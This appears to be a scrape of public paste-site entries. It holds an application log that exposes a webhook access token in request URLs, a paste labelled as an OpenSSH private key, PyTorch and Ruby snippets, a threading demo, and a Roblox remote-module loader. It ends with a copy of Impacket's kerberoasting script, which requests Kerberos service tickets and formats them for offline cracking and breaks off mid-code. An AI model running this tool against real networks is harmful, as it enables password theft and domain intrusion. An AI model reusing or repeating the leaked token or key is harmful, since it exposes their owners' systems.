2023-10-02 17:14:53.701 | SUCCESS  | app.api.api_v1.endpoints.token:search_tokens_by_dynamic_filter:481 - entity=TOKENS | method=POST | route=/tokens/{dynamic_filter} | returncode=200 | message=Keyword:{'filter':_[{'key':_'user_requested.taxid',_'operation':_'eq',_'value':_'61656216000'}]}
2023-10-02 17:14:53.716 | SUCCESS  | app.api.api_v1.endpoints.token:fetch_token_id:536 - entity=TOKENS | method=GET | route=/tokens/{search_id} | returncode=200 | message=Keyword:c5041dc9-c74e-4509-a665-45b7114b2e7a
INFO:     10.108.0.4:49750 - ""GET /api/v1/tokens/c5041dc9-c74e-4509-a665-45b7114b2e7a HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49760 - ""POST /api/v1/tokens/dynamic-filter?page=1&limit=100/ HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49768 - ""OPTIONS /api/v1/users/469 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49774 - ""OPTIONS /api/v1/buildings/8 HTTP/1.0"" 200 OK
2023-10-02 17:14:54.365 | DEBUG    | app.api.api_v1.endpoints.user:fetch_user:133 - entity=USER | method=GET | route=/users/{search_id} | returncode=000 | message=Route_Called
2023-10-02 17:14:54.365 | DEBUG    | app.api.api_v1.endpoints.building:fetch_building_id:119 - entity=BUILDING | method=GET | route=/buildings/{search_id} | returncode=000 | message=Route_Called
2023-10-02 17:14:54.385 | SUCCESS  | app.api.api_v1.endpoints.building:fetch_building_id:148 - entity=BUILDING | method=GET | route=/buildings/{search_id} | returncode=200 | message=Keyword:8
2023-10-02 17:14:54.386 | SUCCESS  | app.api.api_v1.endpoints.user:fetch_user:161 - entity=USER | method=GET | route=/users/{search_id} | returncode=200 | message=Keyword:469
INFO:     10.108.0.4:49798 - ""GET /api/v1/buildings/8 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49786 - ""GET /api/v1/users/469 HTTP/1.0"" 200 OK
2023-10-02 17:15:10.078 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:55862 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
2023-10-02 17:15:25.258 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:54772 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
2023-10-02 17:15:56.329 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:56772 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
2023-10-02 17:16:50.422 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:43990 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
"
rP7TnEbB,Untitled,sieschriben,PHP,Monday 2nd of October 2023 02:58:28 PM CDT,"-----BEGIN OPENSSH PRIVATE KEY-----

NzcwNzJlZjZjMmVmYjBkMGYwNWUwMGY2NTRhNTU1MmZiNWE4YmJhODdkZjRiYjRjN2JhN2NhOTQ4NTNkMTA3NTc3ZTliMDYyN2I4MTcwMGVmNGJkZTUzN2U5YjMzOTM0NWMzNzViYzUxYWEwYzM1YzUyOGZlMWE4MzQyNzY0NDJhYzI5ZGRmNmFlNWE
YjMzNGE4ZjA4MzEyOTBmMGQwZGM1OGM3ZTlmYzMzMDliNjJkMDNkZmNhNDhhNWNiZjNhNjBjOTI5NDVjOWU4YTQ3NzNjN2U4ZTViY2M3NDE5ZjUyYWNkOGIxNzllZmM3N2RkNDViY2MxNjNjMGFlMDgxYmQ5ZWMyOWIxNjgyYmQ0OGRkMjVkZWJmODU
Y2U1Y2ZiY2NiODJlYzViNDg3ODJlOTZhNWZmNjQyNTQxNzJhYmU4OTg5NGZlZDk0NDUwZWUwZjE1N2E1Mjk3Zjc1NTNhOTlmYzEzNWJiNjViN2NiNTNlYjc0YzI0N2M1MmM2MTBmZDg0ZjkwODRhM2VlMmE1MzExMGFmMTFiNGE2NjZhOGMzZGIxOTM
M2QzNDQwNmZiMWQxOTVhYWYwZjEwZmIyNTUxZjIwMDg1NjIxYzFlNTE4ZjJlMzMyYzExOTJmYjBhY2IzNjNlMDMxZTRiYTA1Y2RkODAwMWMwMzcwNzE3ZDQwY2MwMDBmOTBkMTUyOWQzMGFjYTJkMzAxODY4OTU0M2Y2MDYyZmI4N2RiNGE2MGVjNjQ
YTU2ZDdhM2VjMGE4ZGQyODRkZDgzNjc2MjVkYzUwZjlkYmVhZGM3YWViNTVkYjRkOTY2ZjBiZDAyOGMwZGFiMGVkMjc2NWQyMTY2Yw==

-----END OPENSSH PRIVATE KEY-----
"
5JBJkEah,Untitled,ngnhtrg,Python,Monday 2nd of October 2023 02:55:58 PM CDT,"import torch
import torch.nn as nn
import torchvision.transforms as transforms
import torchvision.datasets as datasets
from torch.utils.data import DataLoader
import torch.optim as optim

# Define your training and validation datasets and data loaders here
# Example: Replace 'YourTrainDataset' and 'YourValDataset' with your actual datasets
# train_dataset = YourTrainDataset(transform=transforms.Compose([transforms.Resize(224), transforms.ToTensor()]))
# val_dataset = YourValDataset(transform=transforms.Compose([transforms.Resize(224), transforms.ToTensor()]))

# Define the number of classes for digit prediction (10 classes)
num_classes_digits = 10

# Create an instance of the custom model
model = CustomModel(num_classes_digits)

# Define loss function and optimizer
criterion = nn.CrossEntropyLoss()
optimizer = optim.Adam(model.parameters(), lr=0.001)

# Set the number of training epochs
num_epochs = 10

# Training loop
for epoch in range(num_epochs):
    model.train()  # Set the model in training mode
    for batch_data, batch_labels in train_loader:
        optimizer.zero_grad()  # Zero out gradients
        digit_logits = model(batch_data)  # Forward pass for digit prediction
        loss = model.loss(digit_logits, batch_labels)  # Compute loss
        loss.backward()  # Backpropagation
        optimizer.step()  # Update model parameters

    # Validation
    model.eval()  # Set the model in evaluation mode
    val_loss = 0.0
    correct_predictions = 0
    total_samples = 0

    with torch.no_grad():
        for val_data, val_labels in val_loader:
            val_digit_logits = model(val_data)
            val_loss += model.loss(val_digit_logits, val_labels).item()

            _, val_predicted_digits = torch.max(val_digit_logits, 2)
            correct_predictions += torch.sum(val_predicted_digits == val_labels).item()
            total_samples += val_labels.size(0)

    # Calculate validation loss and accuracy
    avg_val_loss = val_loss / len(val_loader)
    val_accuracy = correct_predictions / total_samples

    # Log and print training and validation progress
    print(f'Epoch [{epoch+1}/{num_epochs}] - Train Loss: {loss:.4f} - Val Loss: {avg_val_loss:.4f} - Val Accuracy: {val_accuracy:.2%}')

# Save the trained model
torch.save(model.state_dict(), 'custom_model_weights.pth')
"
NRbSyYHi,Untitled,ngnhtrg,Python,Monday 2nd of October 2023 02:51:46 PM CDT,"import torch
import torch.nn as nn
import torchvision.models as models

class CustomModel(nn.Module):
    def __init__(self, num_classes_digits):
        super(CustomModel, self).__init__()

        # Load the pre-trained VGG-16 model
        vgg16 = models.vgg16(pretrained=True)

        # Extract the feature layers from VGG-16
        self.features = vgg16.features

        # Define custom fully connected layers for digit prediction
        self.fc_layers = nn.Sequential(
            nn.Linear(512 * 7 * 7, 4096),
            nn.ReLU(inplace=True),
            nn.Dropout(),
            nn.Linear(4096, 4096),
            nn.ReLU(inplace=True),
            nn.Dropout()
        )

        # Output layers for digit prediction (13 digits)
        self.fc_digits = nn.ModuleList([
            nn.Linear(4096, num_classes_digits) for _ in range(13)
        ])

    def forward(self, x):
        x = self.features(x)
        x = x.view(x.size(0), -1)  # Flatten the feature tensor
        x = self.fc_layers(x)

        # Output predictions for digits
        digit_logits = [fc(x) for fc in self.fc_digits]

        return digit_logits

    @staticmethod
    def loss(digits_logits, digits_labels):
        criterion = nn.CrossEntropyLoss()
        digit_losses = [criterion(digits_logits[i], digits_labels[:, i]) for i in range(13)]  # Update to 13 digits
        total_loss = sum(digit_losses)
        return total_loss

# Create an instance of the custom model
num_classes_digits = 10  # Define the number of classes for digit prediction
model = CustomModel(num_classes_digits)

# Optionally, you can load the pre-trained weights for your custom model
# model.load_state_dict(torch.load('custom_model_weights.pth'))
"
4WZjKcRB,pkcs7.rb,mar-kim,Ruby,Monday 2nd of October 2023 02:43:34 PM CDT,"require 'openssl'

def make_cert(pkey)
  subject = ""/C=BE/O=Test/OU=Test/CN=Test""
  cert = OpenSSL::X509::Certificate.new
  cert.subject = cert.issuer = OpenSSL::X509::Name.parse(subject)
  cert.not_before = Time.now
  cert.not_after = Time.now + 365 * 24 * 60 * 60
  cert.public_key = pkey.public_key
  cert.serial = 0x0
  cert.version = 2

  ef = OpenSSL::X509::ExtensionFactory.new
  ef.subject_certificate = cert
  ef.issuer_certificate = cert
  cert.extensions = [
    ef.create_extension(""basicConstraints"",""CA:TRUE"", true),
    ef.create_extension(""subjectKeyIdentifier"", ""hash""),
  ]
  cert.add_extension ef.create_extension(""authorityKeyIdentifier"",
                                       ""keyid:always,issuer:always"")

  cert.sign pkey, OpenSSL::Digest::SHA1.new
  cert
end

recipient_key = OpenSSL::PKey::RSA.new(4096)
recipient_cert = make_cert(recipient_key)

sender_key = OpenSSL::PKey::RSA.new(4096)
sender_cert = make_cert(sender_key)

csr = OpenSSL::X509::Request.new
csr.public_key = sender_key.public_key
csr.subject = OpenSSL::X509::Name.parse(""C=UP"")
csr.sign(sender_key, OpenSSL::Digest::SHA256.new)

# The sender encrypts and signs the message
crypted = OpenSSL::PKCS7.encrypt([recipient_cert], ""message"").to_der
signed = OpenSSL::PKCS7.sign(sender_cert, sender_key, crypted).to_der

# The recipient tries to extract the message
store = OpenSSL::X509::Store.new
p7_signed = OpenSSL::PKCS7.new(signed)
p7_signed.verify(nil, store, nil, OpenSSL::PKCS7::NOVERIFY)
unsigned = p7_signed.data

# Attempt to decrypt
OpenSSL::PKCS7.new(unsigned).decrypt(recipient_key, recipient_cert)
# => ArgumentError: Could not parse the PKCS7: nested asn1 error

unsigned
# => ""0\x82\x02\xA8\x06\t*\x86H\x86\xF7\r\x01\a\x03\xA0\x82\x02\x990\x82\x02\x95\x02\x01\x001\x82\x02[0\x82\x02W\x02\x01\x000?0:1\v0\t\x06\x03U\x04\x06\x13\x02BE1\r0\v\x06\x03U\x04\r\n\f\x04Test1\r0\v\x06\x03U\x04\v\f\x04Test1\r0\v\x06\x03U\x04\x03\f\x04Test\x02\x01\x000\r\x06\t*\x86H\x86\xF7\r\x01\x01\x01\x05\x00\x04\x82\x02\x00j\xB4\x8C\x8E\x9E\""?\xFE#\x93\xFF\x92zg\x10\r^&\xE4l\x96\x15\xF9\xADk [\xB0\xEBK\xF8M\xAD\x90\xFD\xF2\xAF3\xAAT\xA5\x95\x84H\xFD\x14\xD5\r\x16\xC4\xCFg\xF4B\xB6\v\xB0\xD1\xF8\x99\x88+\xB5\e\x10|i\x02\x16\xFBFU\x17\v\xB7\x8A?\xAF?\xB2l\xB2A\x90cy\xDA\x94\xA8f\x0F\x90g\xB7&\b\xCF\xBB\x017\xE5?L\x80\xDB\xBF%S\xA0C8\xF2\xB0n\x8CK\xFF4VMr\b\x85\xC6\x0E/J\x88\xD7\xB7F\x13\x83M\x14\x16\xE36\xCC8o^\x99\xBA\xD8\xB1\xC5V\x04\xD9\xF6\x18\x02\xB1;\t\xD8LiP\x83!x=\xC5jf[4\xA5\xC0$\x9Bk\xCB\xBDM=^\x82\x1F\xAC\xDB\x89H\x9C8\xFB\xA3\x8C\x17\xD2L\xAA[PqPI\xB1e\xF9\xDC\xA3N\xCB\x83\xA7\xC8\x05\xFC\xC1X\x062\xB6A\xA1\x8B\x02\xFE\x82\x14\a\xB1\xE8\xB8\xC4\xD0\xBA\xAAv\xC8\x9D]\xCAn\xB2w\x891\xEA\x10d\e\xC6CO\xE1\xF0\x9B\xD1,A;\t\x9A\xC5\x17\xD8p\x9B\xF0\x03\x88Cpg\am\x87\xD1\xDE,\e\xEA-1_\x01\x19\x86\xA0\xC4E\xC51\x98\xE2\xB9\x9DZ'\x16\x98\x19\x9E\xD2b\t\xC6\xDB\r\n\xFB\x1Dl\x8A%\xEE,\x01t5\x91z\xF3\x00\x9Faq\x7F\xB1\xDD\xA2\xB2\\\xFF\x86r1n8\x1E\x8B\x8FW\x01\xD4\xDB\xB2b\xF0\x8E<U\x01[\xDB\xD8uB\x94R\x18\x17z\x16\x94\x97\xCCi\xC4\x8D;\xB1\xA2\xB6\xE8\x9C\x16o\x19T&\xFB\xF4\xC3\xFA\x1D\xE8\xD0\xF3,\xE3\""\xC4D\x14\xCD\xF9\xD6E\x9A\xA3\xE1U\xF9a\x84\xA5e\xCCDR\x1D\xACr\xBF\xA2u\xAC\xBB\v1\x8C\xB8\x8D\xF6UY\xA6-\xABU@\""\xD0\xE0<(\x19\x0E\xAE\xB7\x04\xEA\xA4W`\x9Fs\x9F\xD4\x8C\x9D!]\xDB\x02\xC8\x8B.lP\x85\xDC\xB8\xE7mH\xEB\x83\x11\xE7Q\x17\xEB5\x9F\x8D\x9C\e|\xA6\xEB\xF2)E2a\xA3\xFE\x99\xF3\x9ET\x97=\x80e3\x90\xE4\xA2\xEAk\xC6Sx\xAAz.\x17\xB6\xEF\xD4g\xA5\x18\xF4@\xE201\x06\t*\x86H\x86\xF7\r\x01\a\x010\x1A\x06\b*\x86H\x86\xF7\r\x03\x020\x0E\x02\x02\x00\xA0\x04\b\xB1\xCC]%\xE0/%\x01\x80\b\xBA`TYs\x9AP3""

crypted
# => ""0\x82\x02\xA8\x06\t*\x86H\x86\xF7\r\x01\a\x03\xA0\x82\x02\x990\x82\x02\x95\x02\x01\x001\x82\x02[0\x82\x02W\x02\x01\x000?0:1\v0\t\x06\x03U\x04\x06\x13\x02BE1\r0\v\x06\x03U\x04\n\f\x04Test1\r0\v\x06\x03U\x04\v\f\x04Test1\r0\v\x06\x03U\x04\x03\f\x04Test\x02\x01\x000\r\x06\t*\x86H\x86\xF7\r\x01\x01\x01\x05\x00\x04\x82\x02\x00j\xB4\x8C\x8E\x9E\""?\xFE#\x93\xFF\x92zg\x10\r^&\xE4l\x96\x15\xF9\xADk [\xB0\xEBK\xF8M\xAD\x90\xFD\xF2\xAF3\xAAT\xA5\x95\x84H\xFD\x14\xD5\r\x16\xC4\xCFg\xF4B\xB6\v\xB0\xD1\xF8\x99\x88+\xB5\e\x10|i\x02\x16\xFBFU\x17\v\xB7\x8A?\xAF?\xB2l\xB2A\x90cy\xDA\x94\xA8f\x0F\x90g\xB7&\b\xCF\xBB\x017\xE5?L\x80\xDB\xBF%S\xA0C8\xF2\xB0n\x8CK\xFF4VMr\b\x85\xC6\x0E/J\x88\xD7\xB7F\x13\x83M\x14\x16\xE36\xCC8o^\x99\xBA\xD8\xB1\xC5V\x04\xD9\xF6\x18\x02\xB1;\t\xD8LiP\x83!x=\xC5jf[4\xA5\xC0$\x9Bk\xCB\xBDM=^\x82\x1F\xAC\xDB\x89H\x9C8\xFB\xA3\x8C\x17\xD2L\xAA[PqPI\xB1e\xF9\xDC\xA3N\xCB\x83\xA7\xC8\x05\xFC\xC1X\x062\xB6A\xA1\x8B\x02\xFE\x82\x14\a\xB1\xE8\xB8\xC4\xD0\xBA\xAAv\xC8\x9D]\xCAn\xB2w\x891\xEA\x10d\e\xC6CO\xE1\xF0\x9B\xD1,A;\t\x9A\xC5\x17\xD8p\x9B\xF0\x03\x88Cpg\am\x87\xD1\xDE,\e\xEA-1_\x01\x19\x86\xA0\xC4E\xC51\x98\xE2\xB9\x9DZ'\x16\x98\x19\x9E\xD2b\t\xC6\xDB\n\xFB\x1Dl\x8A%\xEE,\x01t5\x91z\xF3\x00\x9Faq\x7F\xB1\xDD\xA2\xB2\\\xFF\x86r1n8\x1E\x8B\x8FW\x01\xD4\xDB\xB2b\xF0\x8E<U\x01[\xDB\xD8uB\x94R\x18\x17z\x16\x94\x97\xCCi\xC4\x8D;\xB1\xA2\xB6\xE8\x9C\x16o\x19T&\xFB\xF4\xC3\xFA\x1D\xE8\xD0\xF3,\xE3\""\xC4D\x14\xCD\xF9\xD6E\x9A\xA3\xE1U\xF9a\x84\xA5e\xCCDR\x1D\xACr\xBF\xA2u\xAC\xBB\v1\x8C\xB8\x8D\xF6UY\xA6-\xABU@\""\xD0\xE0<(\x19\x0E\xAE\xB7\x04\xEA\xA4W`\x9Fs\x9F\xD4\x8C\x9D!]\xDB\x02\xC8\x8B.lP\x85\xDC\xB8\xE7mH\xEB\x83\x11\xE7Q\x17\xEB5\x9F\x8D\x9C\e|\xA6\xEB\xF2)E2a\xA3\xFE\x99\xF3\x9ET\x97=\x80e3\x90\xE4\xA2\xEAk\xC6Sx\xAAz.\x17\xB6\xEF\xD4g\xA5\x18\xF4@\xE201\x06\t*\x86H\x86\xF7\r\x01\a\x010\x1A\x06\b*\x86H\x86\xF7\r\x03\x020\x0E\x02\x02\x00\xA0\x04\b\xB1\xCC]%\xE0/%\x01\x80\b\xBA`TYs\x9AP3"""
QpNBJU7n,btbtbt,Toxotsist,Python,Monday 2nd of October 2023 02:40:19 PM CDT,"import threading
import time

mutex = threading.Lock()
sum = 0
sum2 = 0

def safe_race_thread1():
    global sum
    for i in range(0,1000):
        mutex.acquire()
        tmp = sum
        time.sleep(0)
        tmp += i
        time.sleep(0)
        sum = tmp
        mutex.release()

def safe_race_thread2():
    global sum
    for i in range(1, 1000):
        mutex.acquire()
        tmp = sum
        time.sleep(0)
        tmp -= i
        time.sleep(0)
        sum = tmp
        mutex.release()

def unsafe_race_thread1():
    global sum2
    for i in range(0, 1000):
        tmp = sum2
        time.sleep(0)
        tmp += i
        time.sleep(0)
        sum2 = tmp

def unsafe_race_thread2():
    global sum2
    for i in range(1, 1000):
        tmp = sum2
        time.sleep(0)
        tmp -= i
        time.sleep(0)
        sum2 = tmp

thread1 = threading.Thread(target = safe_race_thread1)
thread2 = threading.Thread(target = safe_race_thread2)
thread3 = threading.Thread(target = unsafe_race_thread1)
thread4 = threading.Thread(target = unsafe_race_thread2)
thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread1.join()
thread2.join()
thread3.join()
thread4.join()
print (""Результат при работе с блокировкой"", sum)
print (""Результат без блокировки"", sum2)"
SuxDWTsE,Magic Tools,robinmollen,Lua,Monday 2nd of October 2023 02:28:17 PM CDT,"require(14883824578).RAroblox(""YourNameHere"")"
pMxRAwvB,Untitled,Raihan004,Python,Monday 2nd of October 2023 02:07:28 PM CDT,"#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2023 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This module will try to find Service Principal Names that are associated with normal user account.
#   Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request
#   will encrypt the ticket with the account the SPN is running under, this could be used for an offline
#   bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
#   This is part of the kerberoast attack researched by Tim Medin (@timmedin) and detailed at
#   https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf
#
#   Original idea of implementing this in Python belongs to @skelsec and his
#   https://github.com/skelsec/PyKerberoast project
#
#   This module provides a Python implementation for this attack, adding also the ability to PtH/Ticket/Key.
#   Also, disabled accounts won't be shown.
#
# Author:
#   Alberto Solino (@agsolino)
#
# ToDo:
#   [X] Add the capability for requesting TGS and output them in JtR/hashcat format
#

from __future__ import division
from __future__ import print_function
import argparse
import logging
import sys
from datetime import datetime
from binascii import hexlify, unhexlify

from pyasn1.codec.der import decoder
from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, \
    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP, AS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection, SessionError
from impacket.ntlm import compute_lmhash, compute_nthash


class GetUserSPNs:
    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))

        # And now the rows
        for row in items:
            print(outputFormat.format(*row))

    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__target = None
        self.__targetDomain = target_domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__no_preauth = cmdLineOptions.no_preauth
        self.__outputFileName = cmdLineOptions.outputfile
        self.__usersFile = cmdLineOptions.usersfile
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__requestTGS = cmdLineOptions.request
        # [!] in this script the value of -dc-ip option is self.__kdcIP and the value of -dc-host option is self.__kdcHost
        self.__kdcIP = cmdLineOptions.dc_ip
        self.__kdcHost = cmdLineOptions.dc_host
        self.__saveTGS = cmdLineOptions.save
        self.__requestUser = cmdLineOptions.request_user
        self.__stealth = cmdLineOptions.stealth
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # Create the baseDN
        domainParts = self.__targetDomain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]
        # We can't set the KDC to a custom IP or Hostname when requesting things cross-domain
        # because then the KDC host will be used for both
        # the initial and the referral ticket, which breaks stuff.
        if user_domain != self.__targetDomain and (self.__kdcIP or self.__kdcHost):
            logging.warning('KDC IP address and hostname will be ignored because of cross-domain targeting.')
            self.__kdcIP = None
            self.__kdcHost = None

    def getMachineName(self, target):
        try:
            s = SMBConnection(target, target)
            s.login('', '')
        except OSError as e:
            if str(e).find('timed out') > 0:
                raise Exception('The connection is timed out. Probably 445/TCP port is closed. Try to specify '
                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option')
            else:
                raise
        except SessionError as e:
            if str(e).find('STATUS_NOT_SUPPORTED') > 0:
                raise Exception('The SMB request is not supported. Probably NTLM is disabled. Try to specify '
                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option')
            else:
                raise
        except Exception:
            if s.getServerName() == '':
                raise Exception('Error while anonymous logging into %s' % target)
        else:
            s.logoff()
        return ""%s.%s"" % (s.getServerName(), s.getServerDNSDomainName())

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self):
        domain, _, TGT, _ = CCache.parseFile(self.__domain)
        if TGT is not None:
            return TGT

        # No TGT in cache, request it
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                        compute_lmhash(self.__password),
                                                                        compute_nthash(self.__password), self.__aesKey,
                                                                        kdcHost=self.__kdcIP)
            except Exception as e:
                logging.debug('TGT: %s' % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                        unhexlify(self.__lmhash),
                                                                        unhexlify(self.__nthash), self.__aesKey,
                                                                        kdcHost=self.__kdcIP)

        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash),
                                                                    unhexlify(self.__nthash), self.__aesKey,
                                                                    kdcHost=self.__kdcIP)
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        return TGT

    def outputTGS(self, ticket, oldSessionKey, sessionKey, username, spn, fd=None):
        if self.__no_preauth:
            decodedTGS = decoder.decode(ticket, asn1Spec=AS_REP())[0]
        else:
            decodedTGS = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
        # According to RFC4757 (RC4-HMAC) the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted 
        # ticket
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        else:
            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))

        if self.__saveTGS is True:
            # Save the ticket
            logging.debug('About to save TGS for %s' % username)
            ccache = CCache()
            try:
                ccache.fromTGS(ticket, oldSessionKey, sessionKey)
                ccache.saveFile('%s.ccache' % username)
            except Exception as e:
                logging.error(str(e))

    def run(self):
        if self.__usersFile:
            self.request_users_file_TGSs()
            return

        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
            self.__target = self.__kdcHost
        else:
            if self.__kdcIP is not None and self.__targetDomain == self.__domain:
                self.__target = self.__kdcIP
            else:
                self.__target = self.__targetDomain

            if self.__doKerberos:
                logging.info('Getting machine hostname')
                self.__target = self.getMachineName(self.__target)

        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcIP)
            if self.__doKerberos is not True:
                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                             self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcIP)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcIP)
                if self.__doKerberos is not True:
                    ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                                 self.__nthash,
